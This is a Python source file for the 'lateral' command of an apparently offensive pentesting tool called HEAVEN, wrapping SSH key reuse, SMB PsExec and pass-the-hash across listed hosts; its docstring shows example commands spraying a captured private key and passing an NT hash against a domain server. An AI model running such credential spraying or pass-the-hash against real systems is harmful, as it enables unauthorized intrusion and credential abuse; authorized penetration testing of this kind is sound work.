"""HEAVEN — `heaven lateral` (SSH key reuse / SMB PsExec / pass-the-hash)."""

from __future__ import annotations

import asyncio
import json
import sys
from pathlib import Path
from typing import Optional

import click

from heaven.cli._helpers import _print


@click.command(name="lateral")
@click.option("--ssh-key", type=click.Path(exists=True, dir_okay=False), default=None,
              help="SSH private key file to attempt across targets.")
@click.option("--ssh-user", multiple=True,
              help="SSH username to try (may be repeated, e.g. -u root -u ubuntu).")
@click.option("--smb-user", default="", help="SMB username for PsExec / pass-the-hash.")
@click.option("--smb-domain", default="",
              help="Windows domain (use '.' or hostname for local accounts).")
@click.option("--smb-pass", default="",
              help="SMB password. Mutually exclusive with --smb-nthash.")
@click.option("--smb-nthash", default="",
              help="NT hash for pass-the-hash. Mutually exclusive with --smb-pass.")
@click.option("--target", "-t", multiple=True, required=True,
              help='host:port pairs, e.g. -t 10.0.0.5:22 -t 10.0.0.5:445')
@click.option("--output", "-o", type=click.Path(), default=None,
              help="Write the JSON hop graph to this path.")
@click.option("--i-have-authorization", is_flag=True, required=True,
              help="Required. Lateral movement is destructive — confirm authorization.")
def lateral(
    ssh_key: Optional[str],
    ssh_user: tuple[str, ...],
    smb_user: str, smb_domain: str, smb_pass: str, smb_nthash: str,
    target: tuple[str, ...], output: Optional[str],
    i_have_authorization: bool,
) -> None:
    """Try SSH key reuse + SMB/PsExec across a set of hosts.

    Outputs a "hop graph" of which target accepted which credential, so
    the attack-chain analyzer can incorporate the lateral edges.

    Example — spray a captured id_rsa across 5 hosts:

        heaven lateral \\
            --ssh-key /loot/id_rsa \\
            --ssh-user root --ssh-user ubuntu --ssh-user ec2-user \\
            -t 10.0.0.5:22 -t 10.0.0.6:22 -t 10.0.0.7:22 \\
            --i-have-authorization

    Example — pass-the-hash against an AD member server:

        heaven lateral \\
            --smb-user Administrator --smb-domain CORP \\
            --smb-nthash <NT-HASH-HEX> \\
            -t 10.0.0.20:445 \\
            --i-have-authorization
    """
    if not i_have_authorization:
        _print("[red]Lateral movement requires --i-have-authorization[/red]")
        sys.exit(3)
    if smb_pass and smb_nthash:
        _print("[red]--smb-pass and --smb-nthash are mutually exclusive[/red]")
        sys.exit(2)
    if not ssh_key and not smb_user:
        _print("[red]Need at least one of --ssh-key + --ssh-user OR --smb-user[/red]")
        sys.exit(2)

    # Parse target list
    targets: list[tuple[str, int]] = []
    for t in target:
        if ":" not in t:
            _print(f"[red]Invalid target '{t}' — expected host:port[/red]")
            sys.exit(2)
        host, _, port_s = t.rpartition(":")
        try:
            targets.append((host, int(port_s)))
        except ValueError:
            _print(f"[red]Invalid port in '{t}'[/red]")
            sys.exit(2)

    from heaven.postex.lateral import run_lateral

    _print(f"[cyan]Lateral movement[/cyan] across {len(targets)} target(s)")
    result = asyncio.run(run_lateral(
        authorized=True,
        ssh_key_path=ssh_key, ssh_usernames=list(ssh_user),
        smb_username=smb_user or None, smb_password=smb_pass,
        smb_nthash=smb_nthash, smb_domain=smb_domain,
        targets=targets,
    ))

    _print("\n[bold]Lateral movement summary[/bold]")
    _print(f"  Attempts:   {result['attempted']}")
    _print(f"  Successes:  [green]{result['successful']}[/green]")
    for method, count in (result.get("method_breakdown") or {}).items():
        _print(f"    {method:24}  {count}")
    if result.get("hops"):
        _print("\n[bold]Hop graph:[/bold]")
        for h in result["hops"]:
            _print(f"  {h['from']:24}  →  {h['to']:24}  via {h['technique']:20}  "
                   f"as {h['credential_label']}")
    if result.get("errors"):
        _print(f"\n[dim]{len(result['errors'])} error(s) suppressed — pass --verbose to dump[/dim]")

    if output:
        Path(output).write_text(json.dumps(result, indent=2))
        _print(f"\n[green]JSON written:[/green] {output}")


def register(cli: click.Group) -> None:
    cli.add_command(lateral)
